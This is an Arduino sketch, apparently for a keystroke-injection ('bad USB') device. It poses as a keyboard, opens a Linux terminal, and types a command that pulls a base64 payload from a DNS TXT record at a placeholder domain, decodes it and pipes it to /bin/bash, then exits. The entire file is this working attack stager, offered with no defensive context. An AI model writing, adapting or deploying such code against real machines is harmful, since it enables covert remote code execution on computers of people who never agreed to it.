void setup()
{
	Keyboard.begin();
}

void loop()
{
  delay(5000);
  terminal();
  delay(3000);
  Keyboard.print(F("nslookup -querytype=txt INPUT0 |"));
  delay(100);
  Keyboard.print(F("grep text | cut -d \" \" -f3-"));
  delay(100);
  Keyboard.print(F("|tr -d \"\\\"\" | base64 -d"));
  delay(100);
  Keyboard.println(F(" | /bin/bash"));
  delay(1000);
  Keyboard.println(F("exit"));
  while(true);
}

void terminal()
{
  //in this section we need to open a terminal in linux
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
}

